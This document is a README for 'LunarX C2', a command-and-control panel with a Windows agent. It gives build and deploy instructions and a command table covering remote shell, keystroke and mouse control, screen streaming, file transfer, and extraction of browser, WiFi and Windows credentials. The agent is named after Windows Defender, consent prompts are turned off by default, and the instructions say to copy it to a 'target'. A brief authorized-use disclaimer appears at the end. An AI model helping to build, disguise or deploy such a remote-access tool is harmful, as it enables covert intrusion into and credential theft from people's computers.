# LunarX C2 - Remote Administration Tool

🌙 **LunarX C2** is a powerful Command & Control panel for remote system administration and monitoring.

## 🚀 Features

### 📊 Web Panel
- Real-time device monitoring
- Multi-device management
- Live screen streaming
- Remote command execution
- File manager (upload/download)
- Process management
- Credential extraction
- Browser data detection
- System information dashboard

### 🤖 Agent Capabilities
- **Screenshot capture** - High-quality screen captures
- **Screen streaming** - Real-time screen viewing (configurable FPS/quality)
- **Remote shell** - Execute PowerShell commands
- **File operations** - Browse, upload, download files
- **Mouse/Keyboard control** - Remote input simulation
- **System actions** - Shutdown, restart, logout
- **Credential harvesting** - Browser passwords, WiFi credentials, Windows credentials
- **Message display** - Show custom messages on target
- **Wallpaper change** - Remote wallpaper modification

## 📦 Project Structure

```
├── server/          # Web panel (Node.js + Socket.io)
├── agent/           # Windows agent (Node.js - Standalone .exe)
├── agent-python/    # Python agent (alternative)
└── DEFENDER-Agent-Distributable/  # Pre-compiled agent
```

## 🛠️ Installation

### Server (Web Panel)

```bash
cd server
npm install
node server.js
```

The panel will be available at `http://localhost:3000`

**Default credentials:**
- Username: `admin`
- Password: `admin123`

### Agent Compilation

```bash
cd agent
npm install
npm run build
```

This generates `defender-agent.exe` (~37MB)

### Agent Configuration

Edit `config.json` next to the agent:

```json
{
  "serverUrl": "http://your-server-url:3000",
  "heartbeatInterval": 15000,
  "showConsent": false
}
```

## 🌐 Deploy to Render

1. Push this repository to GitHub
2. Create a new Web Service on [Render](https://render.com)
3. Connect your GitHub repository
4. Render will automatically detect `render.yaml`
5. Click "Create Web Service"

Your panel will be deployed automatically!

## 🔧 Environment Variables

- `JWT_SECRET` - Secret key for JWT tokens (auto-generated in Render)
- `NODE_ENV` - Environment (production/development)
- `PORT` - Server port (default: 3000)

## 📱 Agent Usage

1. Compile the agent with `npm run build`
2. Copy `defender-agent.exe` and `config.json` to target
3. Update `serverUrl` in `config.json`
4. Run `defender-agent.exe`
5. Monitor from web panel

## ⚙️ Technical Details

### Server Stack
- **Node.js** - Runtime
- **Express** - Web framework
- **Socket.io** - Real-time communication
- **SQLite** - Database
- **JWT** - Authentication

### Agent Stack
- **Node.js** - Runtime (packaged with PKG)
- **Socket.io-client** - Server communication
- **PowerShell** - System operations (no native dependencies)

### Security Features
- JWT authentication
- Session management
- Secure WebSocket connections
- Device fingerprinting
- Heartbeat monitoring

## 📋 Available Commands

| Command | Description |
|---------|-------------|
| `ping` | Check connection |
| `sysinfo` | System information |
| `shell <command>` | Execute shell command |
| `processes` | List running processes |
| `ls [path]` | List directory contents |
| `cd <path>` | Change directory |
| `cat <file>` | Read file contents |
| `pwd` | Current directory |
| `password` | Extract credentials |
| `history` | Detect browsers |
| `screenshot` | Take screenshot |
| `msg <text>` | Show message |
| `move_mouse X Y` | Move mouse |
| `click` | Mouse click |
| `type <text>` | Type text |
| `keypress <key>` | Press key |
| `shutdown` | Shutdown system |
| `restart` | Restart system |
| `logout` | Logout user |
| `wallpaper` | Change wallpaper |

## 🎯 Features Highlights

### 🖥️ Screen Streaming
- Adjustable FPS (1-10)
- Quality control (20-100%)
- Real-time display in panel

### 📁 File Manager
- Tree view navigation
- Upload files (up to 25MB)
- Download files
- Windows drive detection

### 🔐 Credential Extraction
- Chrome passwords database
- Edge passwords database
- Firefox login data
- Windows credentials (cmdkey)
- WiFi passwords

### 🎮 Remote Control
- Mouse movement
- Mouse clicks
- Keyboard typing
- Hotkey simulation

## ⚠️ Legal Disclaimer

This tool is for **educational and authorized testing purposes only**. 

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- The authors are not responsible for misuse

## 📄 License

MIT License - Use at your own risk

## 🤝 Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## 📧 Support

For issues and questions, please open an issue on GitHub.

---

Made with 🌙 by LunarX Team
